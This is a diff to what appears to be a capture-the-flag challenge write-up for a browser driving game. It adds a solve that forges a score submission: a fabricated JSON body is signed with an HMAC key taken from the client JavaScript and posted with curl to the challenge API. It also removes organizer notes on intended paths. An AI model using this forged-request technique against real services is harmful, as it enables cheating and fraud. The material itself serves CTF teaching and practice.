@@ -17,6 +17,15 @@ The score is not sent directly: the server applies its own 10-point fuel and
 claim that those pickups were collected without checking which pickups spawned
 or could be reached.
 
+The browser JavaScript also ships the HMAC key used to sign submissions, so
+compute a valid signature for the fabricated body, then submit it:
+
+```sh
+body='{"pickups":{"bonus":52000}}'
+signature=$(printf '%s' "$body" | openssl dgst -sha256 -hmac 'i25-road-crew-dispatch-2026' | awk '{print $NF}')
+curl -fsS -H 'Content-Type: application/json' -H "X-Run-Signature: $signature" --data "$body" https://i25.chal.nocohackers.com/api/crash
+```
+
 ## Seed calculation
 
 At most one pickup can be spawned every five seconds. The highest-value pickup
@@ -26,18 +35,7 @@ is 25 points. Therefore the maximum theoretical rate is
 seconds with at most one spawn, so this bounds legitimate collection even if a
 player collects every opportunity and each is a bonus.
 
-## Unintended paths you're aware of
-
-The intended vulnerability is the unverified pickup event summary. `solve.sh`
-uses the same local API route, as required for autosolve. The flag is injected at
-runtime from the challenge manifest.
-
 ## Difficulty estimate
 
 Beginner; a few minutes for someone who inspects browser network traffic.
 
-## Anything the organizers should watch
-
-Leaderboard data is in-memory and per cookie; service restart clears it. The
-server accepts at most one million claimed pickups per request, enough to beat
-the target while keeping submissions compact and bounded.
